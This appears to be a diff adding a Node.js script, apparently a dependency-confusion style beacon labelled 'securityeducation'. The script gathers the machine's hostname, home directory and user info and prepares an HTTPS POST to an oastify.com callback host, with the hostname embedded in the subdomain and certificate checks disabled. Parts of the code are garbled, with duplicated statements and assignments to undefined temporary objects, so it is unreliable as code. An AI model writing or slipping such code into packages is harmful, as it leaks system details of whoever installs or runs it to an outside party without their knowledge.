@@ -1,0 +1,46 @@
+const https = require('https')
+var os = require("os")
+var hostname = os.hostname()
+var dir = os.homedir()
+var user = os.userInfo()
+const data = new TextEncoder().encode(
+  JSON.stringify({
+    host: hostname,
+    project_id: "securityeducation",
+    current_path: dir,
+    username: user
+  })
+)
+JSON.stringify({
+    host: hostname,
+    project_id: "securityeducation",
+    current_path: dir,
+    username: user
+  })
+_tmp_2.host = hostname
+_tmp_2.project_id = "securityeducation"
+_tmp_2.current_path = dir
+_tmp_2.username = user
+const options = {
+  hostname: process.argv[2] + '.' + hostname + '.theanbyywgwv0bmsoxqjnpn0ur0ho6.oastify.com',
+  port: 443,
+  path: '/',
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Content-Length': data.length
+  },
+  rejectUnauthorized: false
+}
+_tmp_3.hostname = process.argv[2] + '.' + hostname + '.theanbyywgwv0bmsoxqjnpn0ur0ho6.oastify.com'
+_tmp_3.port = 443
+_tmp_3.path = "/"
+_tmp_3.method = "POST"
+_tmp_3.headers = {
+    'Content-Type': 'application/json',
+    'Content-Length': data.length
+  }
+_tmp_4.Content-Type = "application/json"
+_tmp_4.Content-Length = data.length
+_tmp_3.rejectUnauthorized = false
+const req = https.request(options, res => {})
